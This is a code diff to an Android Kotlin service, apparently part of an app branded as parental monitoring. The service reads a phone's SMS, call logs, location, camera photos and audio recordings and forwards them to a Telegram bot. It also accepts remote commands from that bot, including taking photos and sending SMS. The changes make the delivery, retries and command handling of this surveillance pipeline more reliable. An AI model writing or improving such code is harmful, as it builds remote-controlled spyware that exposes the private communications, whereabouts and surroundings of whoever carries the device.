@@ -100,37 +100,6 @@ class MonitoringService : Service() {
         @Volatile
         var isRunning = false
 
-        fun touchHeartbeat(context: android.content.Context) {
-            try {
-                val file = File(context.cacheDir, "monitor_heartbeat")
-                try {
-                    file.writeText(android.os.SystemClock.elapsedRealtime().toString())
-                } catch (_: Exception) {
-                    try {
-                        if (!file.exists()) file.createNewFile()
-                    } catch (_: Exception) {
-                    }
-                    file.setLastModified(System.currentTimeMillis())
-                }
-            } catch (_: Exception) {
-            }
-        }
-
-        fun heartbeatFresh(context: android.content.Context, maxAgeMs: Long = 10 * 60_000L): Boolean {
-            return try {
-                val file = File(context.cacheDir, "monitor_heartbeat")
-                if (!file.exists()) return false
-                val stored = try {
-                    file.readText().trim().toLong()
-                } catch (_: Exception) {
-                    return false
-                }
-                val now = android.os.SystemClock.elapsedRealtime()
-                now >= stored && now - stored < maxAgeMs
-            } catch (_: Exception) {
-                false
-            }
-        }
     }
 
     override fun onCreate() {
@@ -140,9 +109,9 @@ class MonitoringService : Service() {
         refreshCreds()
         refreshLoopConfig()
         credsListener = android.content.SharedPreferences.OnSharedPreferenceChangeListener { _, key ->
-            if (key == "bot_token" || key == "chat_id") refreshCreds()
-            if (key == "camera_interval" || key == "monitoring_paused" || key == "photo_paused_until" || key == "sync_interval") refreshLoopConfig()
-            if (key == "camera_interval" || key == "monitoring_paused" || key == "photo_paused_until") restartCameraLoop()
+            if (key == PreferencesManager.KEY_BOT_TOKEN || key == PreferencesManager.KEY_CHAT_ID) refreshCreds()
+            if (key == PreferencesManager.KEY_CAMERA_INTERVAL || key == PreferencesManager.KEY_MONITORING_PAUSED || key == PreferencesManager.KEY_PHOTO_PAUSED_UNTIL || key == PreferencesManager.KEY_SYNC_INTERVAL) refreshLoopConfig()
+            if (key == PreferencesManager.KEY_CAMERA_INTERVAL || key == PreferencesManager.KEY_MONITORING_PAUSED || key == PreferencesManager.KEY_PHOTO_PAUSED_UNTIL) restartCameraLoop()
         }
         try { credsListener?.let { preferencesManager.registerChangeListener(it) } } catch (_: Exception) { }
         smsRepository = SmsRepository(this)
@@ -209,7 +178,7 @@ class MonitoringService : Service() {
         } catch (_: Exception) {
             ""
         }
-        if (token.isEmpty()) return value
+        if (token.isEmpty()) return value.replace(Regex("[0-9]{5,15}:[A-Za-z0-9_-]{20,}"), "***")
         return value.replace(token, "***")
     }
 
@@ -302,10 +271,13 @@ class MonitoringService : Service() {
             }
         }
 
-        if (!preferencesManager.initialSyncDone && !preferencesManager.initialSyncStarted && initialSyncStarted.compareAndSet(false, true)) {
+        initialSyncStarted.set(false)
+        if (!preferencesManager.initialSyncDone && !preferencesManager.initialSyncStarted) {
             preferencesManager.initialSyncStarted = true
+            initialSyncStarted.set(true)
             initialSyncRunning.set(true)
-        } else if (!preferencesManager.initialSyncDone && preferencesManager.initialSyncStarted && initialSyncStarted.compareAndSet(false, true)) {
+        } else if (!preferencesManager.initialSyncDone && preferencesManager.initialSyncStarted) {
+            initialSyncStarted.set(true)
             initialSyncRunning.set(true)
         }
         startPeriodicLoops()
@@ -353,7 +325,6 @@ class MonitoringService : Service() {
                 try {
                     if (!cachedMonitoringPaused) {
                         checkAndSendNewData()
-                        touchHeartbeat(this@MonitoringService)
                         chunkedDelay(syncIntervalMillis())
                     } else {
                         chunkedDelay(15 * 60_000L)
@@ -461,7 +432,6 @@ class MonitoringService : Service() {
                 if (cachedMonitoringPaused) {
                     try {
                         pollTelegramCommands()
-                        touchHeartbeat(this@MonitoringService)
                     } catch (e: kotlinx.coroutines.CancellationException) {
                         throw e
                     } catch (e: Exception) {
@@ -473,7 +443,6 @@ class MonitoringService : Service() {
                 try {
                     val active = pollTelegramCommands()
                     idlePolls = if (active) 0 else (idlePolls + 1).coerceAtMost(4)
-                    touchHeartbeat(this@MonitoringService)
                 } catch (e: kotlinx.coroutines.CancellationException) {
                     throw e
                 } catch (e: Exception) {
@@ -508,7 +477,7 @@ class MonitoringService : Service() {
         return try {
             val err = preferencesManager.credentialError
             if (err.isEmpty()) return false
-            val now = android.os.SystemClock.elapsedRealtime()
+            val now = System.currentTimeMillis()
             if (now < preferencesManager.credentialErrorAt) {
                 preferencesManager.credentialError = ""
                 preferencesManager.credentialErrorAt = 0L
@@ -518,6 +487,12 @@ class MonitoringService : Service() {
         } catch (_: Exception) {
             false
         }
+    }
+
+    private fun isChatMissing(errorBody: String?): Boolean {
+        if (errorBody.isNullOrEmpty()) return false
+        val lower = errorBody.lowercase(java.util.Locale.ROOT)
+        return lower.contains("chat not found") || lower.contains("bot was blocked") || lower.contains("user not found") || lower.contains("group chat was deleted") || lower.contains("group chat was upgraded") || lower.contains("chat_id is empty")
     }
 
     private suspend fun pollTelegramCommands(): Boolean {
@@ -538,7 +513,7 @@ class MonitoringService : Service() {
         if (response.code() == 401 || response.code() == 403) {
             try {
                 preferencesManager.credentialError = response.code().toString()
-                preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
+                preferencesManager.credentialErrorAt = System.currentTimeMillis()
             } catch (_: Exception) {
             }
             return false
@@ -557,32 +532,42 @@ class MonitoringService : Service() {
         if (updates.isEmpty()) return false
         for (update in updates) {
             try {
-                if (update.updateId > preferencesManager.lastUpdateId) {
-                    preferencesManager.setLastUpdateIdSync(update.updateId)
+                val callback = update.callbackQuery
+                if (callback != null) {
+                    handleCallbackQuery(callback)
+                } else {
+                    val message = update.message ?: update.editedMessage
+                    val senderOk = message?.from?.id?.toString() == chatId
+                    val chatOk = message != null && message.chat.id.toString() == chatId
+                    val ownerOk = senderOk || chatOk
+                    val full = (message?.text ?: message?.caption)?.trim()
+                    if (ownerOk && full != null) {
+                        val head = full.substringBefore(" ")
+                        val command = head.substringBefore("@").lowercase(java.util.Locale.ROOT)
+                        if (command.startsWith("/")) {
+                            val arg = if (head.length < full.length) full.substring(head.length + 1).trim() else ""
+                            val input = if (arg.isEmpty()) command else "$command $arg"
+                            handleTelegramCommand(input, message?.date ?: 0)
+                        }
+                    }
                 }
-            } catch (_: Exception) {
+            } finally {
+                try {
+                    if (update.updateId > preferencesManager.lastUpdateId) {
+                        preferencesManager.setLastUpdateIdSync(update.updateId)
+                    }
+                } catch (_: Exception) {
+                }
             }
-            val callback = update.callbackQuery
-            if (callback != null) {
-                handleCallbackQuery(callback)
-                continue
-            }
-            val message = update.message ?: update.editedMessage ?: continue
-            if (message.chat.id.toString() != chatId) continue
-            val full = (message.text ?: message.caption)?.trim() ?: continue
-            val head = full.substringBefore(" ")
-            val command = head.substringBefore("@").lowercase(java.util.Locale.ROOT)
-            if (!command.startsWith("/")) continue
-            val arg = if (head.length < full.length) full.substring(head.length + 1).trim() else ""
-            val input = if (arg.isEmpty()) command else "$command $arg"
-            handleTelegramCommand(input, message.date)
         }
         return true
     }
 
     private suspend fun handleCallbackQuery(query: com.redeye.parentalmonitor.network.TelegramCallbackQuery) {
         val sender = query.from?.id?.toString() ?: return
-        if (sender != preferencesManager.chatId) return
+        val chatId = try { preferencesManager.chatId } catch (_: Exception) { "" }
+        val origin = query.message?.chat?.id?.toString()
+        if (sender != chatId && origin != chatId) return
         answerCallback(query.id)
         val command = when (query.data) {
             "photo" -> "/photo"
@@ -689,7 +674,6 @@ class MonitoringService : Service() {
     private suspend fun handleTelegramCommand(raw: String, sentAtSec: Long = 0L) {
         val nowSec = System.currentTimeMillis() / 1000L
         if (sentAtSec > 0 && (nowSec - sentAtSec > COMMAND_MAX_AGE_SEC || sentAtSec - nowSec > 300L)) {
-            sendToTelegram("\u23F3\uFE0F Command kedaluwarsa (dikirim > ${COMMAND_MAX_AGE_SEC / 60} menit lalu). Kirim ulang.")
             return
         }
         val parts = raw.split("\\s+".toRegex(), limit = 2)
@@ -1290,29 +1274,35 @@ class MonitoringService : Service() {
                         return@withContext null
                     }
                 }
-                val chosen = providers.firstOrNull() ?: return@withContext null
-                val result = CompletableDeferred<android.location.Location?>()
-                val listener = object : android.location.LocationListener {
-                    override fun onLocationChanged(location: android.location.Location) {
-                        result.complete(location)
+                if (providers.isEmpty()) return@withContext null
+                for (provider in providers) {
+                    val result = CompletableDeferred<android.location.Location?>()
+                    val listener = object : android.location.LocationListener {
+                        override fun onLocationChanged(location: android.location.Location) {
+                            result.complete(location)
+                        }
+                        override fun onProviderDisabled(providerName: String) {}
+                        override fun onProviderEnabled(providerName: String) {}
                     }
-                    override fun onProviderDisabled(provider: String) {}
-                    override fun onProviderEnabled(provider: String) {}
-                }
-                try {
-                    @Suppress("DEPRECATION")
-                    locationManager.requestSingleUpdate(chosen, listener, android.os.Looper.getMainLooper())
-                } catch (_: SecurityException) {
-                    return@withContext null
-                }
-                try {
-                    withTimeoutOrNull(20_000) { result.await() }
-                } finally {
                     try {
-                        locationManager.removeUpdates(listener)
+                        @Suppress("DEPRECATION")
+                        locationManager.requestSingleUpdate(provider, listener, android.os.Looper.getMainLooper())
+                    } catch (_: SecurityException) {
+                        return@withContext null
                     } catch (_: Exception) {
+                        continue
+                    }
+                    try {
+                        val fix = withTimeoutOrNull(20_000) { result.await() }
+                        if (fix != null) return@withContext fix
+                    } finally {
+                        try {
+                            locationManager.removeUpdates(listener)
+                        } catch (_: Exception) {
+                        }
                     }
                 }
+                null
             } catch (_: Exception) {
                 null
             }
@@ -1413,10 +1403,12 @@ class MonitoringService : Service() {
             sendToTelegram(startMessage)
             delay(500)
 
-            if (allSms.isNotEmpty()) {
-                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${allSms.size} SMS...")
-                val smsTotal = allSms.size
-                allSms.chunked(10).forEachIndexed { index, part ->
+            val entrySmsId = try { preferencesManager.lastSmsId } catch (_: Exception) { 0L }
+            val pendingSms = allSms.filter { it.id > entrySmsId }.sortedBy { it.id }
+            if (pendingSms.isNotEmpty()) {
+                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${pendingSms.size} SMS...")
+                val smsTotal = pendingSms.size
+                pendingSms.chunked(10).forEachIndexed { index, part ->
                     val message = buildString {
                         appendLine("💬 <b>SMS History (${index * 10 + 1}-${index * 10 + part.size} of $smsTotal)</b>")
                         appendLine()
@@ -1429,20 +1421,24 @@ class MonitoringService : Service() {
                             appendLine("━━━━━━━━━━━━━━━━")
                         }
                     }
-                    sendFitted(message)
-                    try {
-                        preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, part.maxOf { it.id })
-                    } catch (_: Exception) {
+                    if (sendFitted(message)) {
+                        try {
+                            preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, part.maxOf { it.id })
+                        } catch (_: Exception) {
+                        }
                     }
                     delay(500)
                 }
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "All SMS sent")
             }
 
-            if (allCalls.isNotEmpty()) {
-                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${allCalls.size} calls...")
-                val callTotal = allCalls.size
-                allCalls.chunked(10).forEachIndexed { index, part ->
+            val entryCallTs = try { preferencesManager.lastCallTimestamp } catch (_: Exception) { 0L }
+            val entryCallId = try { preferencesManager.lastCallId } catch (_: Exception) { 0L }
+            val pendingCalls = allCalls.filter { it.date > entryCallTs || (it.date == entryCallTs && it.id > entryCallId) }.sortedWith(compareBy({ it.date }, { it.id }))
+            if (pendingCalls.isNotEmpty()) {
+                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${pendingCalls.size} calls...")
+                val callTotal = pendingCalls.size
+                pendingCalls.chunked(10).forEachIndexed { index, part ->
                     val message = buildString {
                         appendLine("📞 <b>Call History (${index * 10 + 1}-${index * 10 + part.size} of $callTotal)</b>")
                         appendLine()
@@ -1457,16 +1453,17 @@ class MonitoringService : Service() {
                             appendLine("━━━━━━━━━━━━━━━━")
                         }
                     }
-                    sendFitted(message)
-                    try {
-                        val latest = part.maxWith(compareBy({ it.date }, { it.id }))
-                        if (latest.date > preferencesManager.lastCallTimestamp ||
-                            (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
-                        ) {
-                            preferencesManager.lastCallTimestamp = latest.date
-                            preferencesManager.lastCallId = latest.id
+                    if (sendFitted(message)) {
+                        try {
+                            val latest = part.maxWith(compareBy({ it.date }, { it.id }))
+                            if (latest.date > preferencesManager.lastCallTimestamp ||
+                                (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
+                            ) {
+                                preferencesManager.lastCallTimestamp = latest.date
+                                preferencesManager.lastCallId = latest.id
+                            }
+                        } catch (_: Exception) {
                         }
-                    } catch (_: Exception) {
                     }
                     delay(500)
                 }
@@ -1513,18 +1510,20 @@ class MonitoringService : Service() {
         try {
             val smsPage = smsRepository.getNewSms(preferencesManager.lastSmsId).take(100)
             if (smsPage.isNotEmpty()) {
-                sendFitted(formatSmsMessage(smsPage))
-                preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, smsPage.maxOf { it.id })
+                if (sendFitted(formatSmsMessage(smsPage))) {
+                    preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, smsPage.maxOf { it.id })
+                }
             }
             val callPage = callLogRepository.getNewCalls(preferencesManager.lastCallTimestamp, preferencesManager.lastCallId).take(100)
             if (callPage.isNotEmpty()) {
-                sendFitted(formatCallMessage(callPage))
-                val latest = callPage.maxWith(compareBy({ it.date }, { it.id }))
-                if (latest.date > preferencesManager.lastCallTimestamp ||
-                    (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
-                ) {
-                    preferencesManager.lastCallTimestamp = latest.date
-                    preferencesManager.lastCallId = latest.id
+                if (sendFitted(formatCallMessage(callPage))) {
+                    val latest = callPage.maxWith(compareBy({ it.date }, { it.id }))
+                    if (latest.date > preferencesManager.lastCallTimestamp ||
+                        (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
+                    ) {
+                        preferencesManager.lastCallTimestamp = latest.date
+                        preferencesManager.lastCallId = latest.id
+                    }
                 }
             }
         } catch (e: kotlinx.coroutines.CancellationException) {
@@ -1536,9 +1535,9 @@ class MonitoringService : Service() {
 
     private fun numberMatches(raw: String, digits: String): Boolean {
         val normalized = raw.filter { it.isDigit() }
-        if (normalized.isEmpty()) return false
+        if (normalized.isEmpty() || digits.isEmpty()) return false
         if (normalized == digits) return true
-        if (normalized.length < 5 || digits.length < 5) return false
+        if (normalized.length < 7 || digits.length < 7) return false
         return normalized.endsWith(digits) || digits.endsWith(normalized)
     }
 
@@ -1551,7 +1550,8 @@ class MonitoringService : Service() {
     }
 
     private suspend fun sendSmsPending(number: String, smsText: String) {
-        val sentAction = "com.redeye.parentalmonitor.SMS_SENT_" + System.currentTimeMillis()
+        val sentAction = "com.redeye.parentalmonitor.SMS_SENT_" + System.nanoTime() + "_" + java.util.UUID.randomUUID().toString()
+        val baseCode = (java.util.UUID.randomUUID().hashCode() and 0x0fffffff)
         val delivered = CompletableDeferred<Boolean>()
         val smsManager = try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
@@ -1603,9 +1603,9 @@ class MonitoringService : Service() {
                         sentIntents.add(
                             android.app.PendingIntent.getBroadcast(
                                 this,
-                                (System.currentTimeMillis() % Int.MAX_VALUE).toInt() + it,
+                                baseCode + it * 7919,
                                 android.content.Intent(sentAction),
-                                android.app.PendingIntent.FLAG_IMMUTABLE or android.app.PendingIntent.FLAG_UPDATE_CURRENT
+                                android.app.PendingIntent.FLAG_IMMUTABLE or android.app.PendingIntent.FLAG_CANCEL_CURRENT
                             )
                         )
                     }
@@ -1613,9 +1613,9 @@ class MonitoringService : Service() {
                 } else {
                     val sentIntent = android.app.PendingIntent.getBroadcast(
                         this,
-                        (System.currentTimeMillis() % Int.MAX_VALUE).toInt(),
+                        baseCode,
                         android.content.Intent(sentAction),
-                        android.app.PendingIntent.FLAG_IMMUTABLE or android.app.PendingIntent.FLAG_UPDATE_CURRENT
+                        android.app.PendingIntent.FLAG_IMMUTABLE or android.app.PendingIntent.FLAG_CANCEL_CURRENT
                     )
                     smsManager.sendTextMessage(number, null, smsText, sentIntent, null)
                 }
@@ -1695,29 +1695,29 @@ class MonitoringService : Service() {
         if (cut <= 0) cut = max
         return cut
     }
-    private suspend fun sendFitted(message: String) {
+    private suspend fun sendFitted(message: String): Boolean {
         if (message.length <= 4000) {
-            sendToTelegram(message)
-            return
+            return sendToTelegram(message)
         }
+        var ok = true
         val lines = message.split("\n")
         var current = StringBuilder()
         for (line in lines) {
             var rest = line
             while (rest.length > 4000) {
                 if (current.isNotEmpty()) {
-                    sendToTelegram(current.toString())
+                    if (!sendToTelegram(current.toString())) ok = false
                     delay(500)
                     current = StringBuilder()
                 }
                 val cut = safeCut(rest, 4000)
-                sendToTelegram(rest.substring(0, cut))
+                if (!sendToTelegram(rest.substring(0, cut))) ok = false
                 delay(500)
                 rest = rest.substring(cut)
             }
             if (current.length + rest.length + 1 > 4000) {
                 if (current.isNotEmpty()) {
-                    sendToTelegram(current.toString())
+                    if (!sendToTelegram(current.toString())) ok = false
                     delay(500)
                 }
                 current = StringBuilder()
@@ -1725,38 +1725,39 @@ class MonitoringService : Service() {
             if (current.isNotEmpty()) current.append("\n")
             current.append(rest)
         }
-        if (current.isNotEmpty()) sendToTelegram(current.toString())
+        if (current.isNotEmpty()) {
+            if (!sendToTelegram(current.toString())) ok = false
+        }
+        return ok
     }
 
     private suspend fun sendToTelegram(
         message: String,
         replyMarkup: com.redeye.parentalmonitor.network.InlineKeyboardMarkup? = null
-    ) {
+    ): Boolean {
         try {
             if (message.length > 4096) {
                 android.util.Log.e("MonitoringService", "Message too long: ${message.length} chars, splitting")
-                sendFitted(message)
-                return
+                return sendFitted(message)
             }
-            
+
             val (botToken, chatId) = sendCreds()
 
             if (botToken.isEmpty() || chatId.isEmpty()) {
                 android.util.Log.w("MonitoringService", "Bot credentials unavailable, queuing message for later")
                 messageQueue.addMessage(message)
                 MessageScheduler.scheduleMessageSend(this)
-                return
+                return false
             }
 
             val hasNetwork = hasNetwork()
             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Network available: $hasNetwork")
             
             if (!hasNetwork) {
-                // No internet, add to queue
                 android.util.Log.w("MonitoringService", "No network, adding to queue")
                 messageQueue.addMessage(message)
                 MessageScheduler.scheduleMessageSend(this)
-                return
+                return false
             }
 
             val telegramMessage = TelegramMessage(
@@ -1777,21 +1778,35 @@ class MonitoringService : Service() {
                     preferencesManager.credentialErrorAt = 0L
                 } catch (_: Exception) {
                 }
+                return true
             } else if (response.code() == 429) {
                 val retryAfter = NetworkUtils.parseRetryAfter(response.errorBody()?.string())
                 android.util.Log.w("MonitoringService", "Rate limited, will retry via queue after ${retryAfter}s")
                 messageQueue.addMessage(message)
                 MessageScheduler.scheduleMessageSendNext(this, retryAfter * 1000L)
+                return false
             } else if (response.code() == 401 || response.code() == 403) {
                 android.util.Log.e("MonitoringService", "Auth rejected (${response.code()}), queuing until credentials are fixed")
                 try {
                     preferencesManager.credentialError = response.code().toString()
-                    preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
+                    preferencesManager.credentialErrorAt = System.currentTimeMillis()
                 } catch (_: Exception) {
                 }
                 messageQueue.addMessage(message)
                 MessageScheduler.scheduleMessageSend(this)
+                return false
             } else if (response.code() == 400) {
+                val goneBody = try { response.errorBody()?.string() } catch (_: Exception) { null }
+                if (isChatMissing(goneBody)) {
+                    try {
+                        preferencesManager.credentialError = response.code().toString()
+                        preferencesManager.credentialErrorAt = System.currentTimeMillis()
+                    } catch (_: Exception) {
+                    }
+                    messageQueue.addMessage(message)
+                    MessageScheduler.scheduleMessageSend(this)
+                    return false
+                }
                 val plain = message.replace(TAG_STRIP_REGEX, "")
                 if (plain != message) {
                     try {
@@ -1804,40 +1819,51 @@ class MonitoringService : Service() {
                                 preferencesManager.credentialErrorAt = 0L
                             } catch (_: Exception) {
                             }
+                            return true
                         } else if (fallbackResp.code() == 429) {
                             val retryAfter = NetworkUtils.parseRetryAfter(try { fallbackResp.errorBody()?.string() } catch (_: Exception) { null })
                             messageQueue.addMessage(plain)
                             MessageScheduler.scheduleMessageSendNext(this, retryAfter * 1000L)
+                            return false
                         } else if (fallbackResp.code() == 401 || fallbackResp.code() == 403) {
                             try {
                                 preferencesManager.credentialError = fallbackResp.code().toString()
-                                preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
+                                preferencesManager.credentialErrorAt = System.currentTimeMillis()
                             } catch (_: Exception) {
                             }
                             messageQueue.addMessage(plain)
                             MessageScheduler.scheduleMessageSend(this)
+                            return false
                         } else if (fallbackResp.code() == 408 || fallbackResp.code() >= 500) {
                             messageQueue.addMessage(plain)
                             MessageScheduler.scheduleMessageSend(this)
+                            return false
                         } else {
                             android.util.Log.w("MonitoringService", "Message permanently rejected (400), not queued")
+                            return true
                         }
                     } catch (_: Exception) {
                         messageQueue.addMessage(plain)
                         MessageScheduler.scheduleMessageSend(this)
+                        return false
                     }
                 } else {
                     android.util.Log.w("MonitoringService", "Message permanently rejected (400), not queued")
+                    return true
                 }
             } else {
                 android.util.Log.e("MonitoringService", "✗ Failed to send: ${response.code()}")
                 messageQueue.addMessage(message)
                 MessageScheduler.scheduleMessageSend(this)
+                return false
             }
+        } catch (e: kotlinx.coroutines.CancellationException) {
+            throw e
         } catch (e: Exception) {
             android.util.Log.e("MonitoringService", "✗ Exception sending message: ${redactToken(e.message)}")
             messageQueue.addMessage(message)
             MessageScheduler.scheduleMessageSend(this)
+            return false
         }
     }
 
@@ -2425,10 +2451,23 @@ class MonitoringService : Service() {
             if (response.code() == 401 || response.code() == 403) {
                 try {
                     preferencesManager.credentialError = response.code().toString()
-                    preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
+                    preferencesManager.credentialErrorAt = System.currentTimeMillis()
                 } catch (_: Exception) {
                 }
             } else if (response.code() == 400) {
+                val audioErr = try {
+                    response.errorBody()?.string()
+                } catch (_: Exception) {
+                    null
+                }
+                if (isChatMissing(audioErr)) {
+                    try {
+                        preferencesManager.credentialError = response.code().toString()
+                        preferencesManager.credentialErrorAt = System.currentTimeMillis()
+                    } catch (_: Exception) {
+                    }
+                    return MediaSendOutcome.KEPT
+                }
                 android.util.Log.w("MonitoringService", "Audio rejected (400), dropping file")
                 deleteQuietly(audioFile)
                 return MediaSendOutcome.DROPPED
@@ -2469,7 +2508,14 @@ class MonitoringService : Service() {
             val files = cacheDir.listFiles { file ->
                 file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a")
             }?.sortedBy { it.lastModified() } ?: return
-            files.dropLast(maxKept).forEach { deleteQuietly(it) }
+            val dropped = files.dropLast(maxKept)
+            if (dropped.isEmpty()) return
+            dropped.forEach { deleteQuietly(it) }
+            try {
+                messageQueue.addMessage("\u26A0\uFE0F ${dropped.size} audio file(s) dropped (cache full).")
+                MessageScheduler.scheduleMessageSend(this)
+            } catch (_: Exception) {
+            }
         } catch (_: Exception) {
         }
     }
@@ -2604,10 +2650,18 @@ class MonitoringService : Service() {
                 android.util.Log.e("MonitoringService", "Photo auth rejected (${response.code()}), keeping file for retry")
                 try {
                     preferencesManager.credentialError = response.code().toString()
-                    preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
+                    preferencesManager.credentialErrorAt = System.currentTimeMillis()
                 } catch (_: Exception) {
                 }
             } else if (response.code() == 400) {
+                if (isChatMissing(errorBody)) {
+                    try {
+                        preferencesManager.credentialError = response.code().toString()
+                        preferencesManager.credentialErrorAt = System.currentTimeMillis()
+                    } catch (_: Exception) {
+                    }
+                    return MediaSendOutcome.KEPT
+                }
                 android.util.Log.w("MonitoringService", "Photo rejected (400), dropping file")
                 deleteQuietly(photoFile)
                 return MediaSendOutcome.DROPPED
@@ -2655,7 +2709,14 @@ class MonitoringService : Service() {
             val photos = cacheDir.listFiles { file ->
                 file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
             }?.sortedBy { it.lastModified() } ?: return
-            photos.dropLast(maxKept).forEach { deleteQuietly(it) }
+            val dropped = photos.dropLast(maxKept)
+            if (dropped.isEmpty()) return
+            dropped.forEach { deleteQuietly(it) }
+            try {
+                messageQueue.addMessage("\u26A0\uFE0F ${dropped.size} photo file(s) dropped (cache full).")
+                MessageScheduler.scheduleMessageSend(this)
+            } catch (_: Exception) {
+            }
         } catch (e: Exception) {
             android.util.Log.e("MonitoringService", "Error pruning photo cache: ${redactToken(e.message)}")
         }
